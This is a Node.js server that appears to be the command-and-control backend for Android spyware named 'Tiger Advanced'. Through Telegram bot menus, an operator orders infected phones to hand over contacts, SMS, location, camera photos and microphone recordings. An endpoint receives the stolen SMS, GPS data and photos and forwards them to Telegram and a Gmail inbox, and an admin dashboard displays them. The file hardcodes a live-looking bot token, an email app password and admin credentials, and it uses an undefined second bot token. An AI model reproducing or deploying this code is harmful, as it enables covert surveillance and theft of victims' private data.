const express = require('express');
const axios = require('axios');
const path = require('path');
const nodemailer = require('nodemailer');
const app = express();

// --- Device Command Queue (in-memory, for demo) ---
const deviceCommands = {};

// Endpoint to queue a command for a device (for testing/demo)
app.post('/send-command', (req, res) => {
    const { deviceId, command, payload } = req.body;
    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
    deviceCommands[deviceId] = { command, payload };
    res.json({ status: 'queued', deviceId, command });
});

// Endpoint for APK to poll for commands
app.post('/get-command', (req, res) => {
    const { deviceId } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    const cmd = deviceCommands[deviceId];
    if (cmd) {
        // Remove command after sending (one-time)
        delete deviceCommands[deviceId];
        return res.json(cmd);
    }
    res.json({});
});


// Photo (Base64) badi hoti hai, isliye limit badhana zaruri hai
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// --- ⚙️ CONFIGURATION ---
const ADMIN_USER = "admin";
const ADMIN_PASS = "tiger@123";

const BOT_1_TOKEN = '8592457059:AAGRtcgD8_ajWaiEVk7smOi0tqzDK3HNBuI';
const CHAT_ID = '8592457059';

// --- Telegram Command Handler ---
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_1_TOKEN}`;
const DATA_COMMANDS = [
    { command: 'contacts', label: 'Contacts' },
    { command: 'sms', label: 'SMS' },
    { command: 'location', label: 'Location' },
    { command: 'device', label: 'Device Info' },
];

const HARDWARE_COMMANDS = [
    { command: 'camera_test', label: 'Camera Test' },
    { command: 'mic_test', label: 'Mic Test' },
    { command: 'sensor_test', label: 'Sensor Test' },
];

app.post('/telegram-webhook', async (req, res) => {
    const body = req.body;
    if (body.message && body.message.text === '/getdata') {
        // Show buttons for all commands and hardware test
        const buttons = [
            ...DATA_COMMANDS.map(cmd => [{
                text: cmd.label,
                callback_data: `getdata_${cmd.command}`
            }]),
            [{ text: 'Hardware Test', callback_data: 'hardware_test' }]
        ];
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: body.message.chat.id,
            text: 'Select data to get from APK:',
            reply_markup: { inline_keyboard: buttons }
        });
        return res.sendStatus(200);
    }
    // Handle button press for data
    if (body.callback_query && body.callback_query.data.startsWith('getdata_')) {
        const cmd = body.callback_query.data.replace('getdata_', '');
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: body.callback_query.message.chat.id,
            text: `Command sent to APK: ${cmd}`
        });
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: body.callback_query.id
        });
        return res.sendStatus(200);
    }
    // Handle hardware test button
    if (body.callback_query && body.callback_query.data === 'hardware_test') {
        // Show hardware test options
        const hwButtons = HARDWARE_COMMANDS.map(cmd => [{
            text: cmd.label,
            callback_data: `hwtest_${cmd.command}`
        }]);
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: body.callback_query.message.chat.id,
            text: 'Select hardware test:',
            reply_markup: { inline_keyboard: hwButtons }
        });
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: body.callback_query.id
        });
        return res.sendStatus(200);
    }
    // Handle hardware test sub-options
    if (body.callback_query && body.callback_query.data.startsWith('hwtest_')) {
        const hwCmd = body.callback_query.data.replace('hwtest_', '');
        let msg = '';
        if (hwCmd === 'camera_test') msg = 'Camera test command sent. Please send a photo.';
        else if (hwCmd === 'mic_test') msg = 'Mic test command sent. Please send a 2-minute recording.';
        else if (hwCmd === 'sensor_test') msg = 'Sensor test command sent. Please send sensor status.';
        else msg = 'Unknown hardware test.';
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: body.callback_query.message.chat.id,
            text: msg
        });
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: body.callback_query.id
        });
        return res.sendStatus(200);
    }
    res.sendStatus(200);
});

const MY_EMAIL = "harshrajsharma359@gmail.com";
const APP_PASSWORD = "ulhw zrxc bzbt hqnl";

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: { user: MY_EMAIL, pass: APP_PASSWORD }
});
// -----------------------

let smsLogs = [];

// 1. DATA RECEIVE ENDPOINT (SMS, GPS, PHOTO)
app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device, timestamp, location, photo } = req.body;
        
        const mapsLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : "Not Available";
        
        const newEntry = {
            id: Date.now(),
            device: device || 'Tiger-Mobile',
            sender: sender || 'System',
            message: message || 'No SMS Content',
            time: timestamp || new Date().toLocaleString(),
            location: mapsLink
        };

        smsLogs.unshift(newEntry);
        if (smsLogs.length > 100) smsLogs.pop();

        const telegramMsg = `🐯 *Tiger Advanced Alert!*\n\n` +
                          `📱 *Device:* ${newEntry.device}\n` +
                          `👤 *From:* ${newEntry.sender}\n` +
                          `💬 *Msg:* ${newEntry.message}\n` +
                          `📍 *GPS:* [View Location](${mapsLink})\n` +
                          `⏰ *Time:* ${newEntry.time}`;

        // --- Telegram Delivery ---
        const sendToTelegram = async (token) => {
            if (photo) {
                // Photo ke saath bhejnah
                const photoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
                await axios.post(photoUrl, {
                    chat_id: CHAT_ID,
                    photo: photo, // Base64 string
                    caption: telegramMsg,
                    parse_mode: 'Markdown'
                });
            } else {
                // Bina photo ke bhejnah
                await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: telegramMsg,
                    parse_mode: 'Markdown'
                });
            }
        };

        // Dono bots par bhej rahe hain
        await Promise.all([sendToTelegram(BOT_1_TOKEN), sendToTelegram(BOT_2_TOKEN)]);

        // --- Email Delivery ---
        const mailOptions = {
            from: `"Tiger Advanced" <${MY_EMAIL}>`,
            to: MY_EMAIL,
            subject: `Tiger Alert from ${newEntry.sender}`,
            html: `<h3>New Update</h3>
                   <p><b>Sender:</b> ${newEntry.sender}</p>
                   <p><b>Message:</b> ${newEntry.message}</p>
                   <p><b>Location:</b> <a href="${mapsLink}">Google Maps Link</a></p>
                   <p><b>Time:</b> ${newEntry.time}</p>`,
            attachments: photo ? [{ filename: 'user_photo.jpg', content: photo, encoding: 'base64' }] : []
        };
        await transporter.sendMail(mailOptions);

        res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).json({ status: 'error' });
    }
});

// 2. ADMIN PANEL ACCESS
app.get('/admin', (req, res) => {
    const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
    const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');

    if (login === ADMIN_USER && password === ADMIN_PASS) {
        return res.send(`
            <html>
            <head><title>Tiger Dashboard</title></head>
            <body style="font-family: Arial; padding: 20px;">
                <h2>🐅 Tiger Advanced Dashboard</h2>
                <table border="1" style="width:100%; border-collapse: collapse;">
                    <tr style="background:#eee;"><th>Time</th><th>Sender</th><th>Message</th><th>GPS</th></tr>
                    ${smsLogs.map(l => `<tr><td>${l.time}</td><td>${l.sender}</td><td>${l.message}</td><td><a href="${l.location}" target="_blank">Maps</a></td></tr>`).join('')}
                </table>
                <script>setTimeout(() => location.reload(), 15000);</script>
            </body>
            </html>
        `);
    }
    res.set('WWW-Authenticate', 'Basic realm="401"');
    res.status(401).send('Authentication required.');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Tiger Server Live on ${PORT}`));
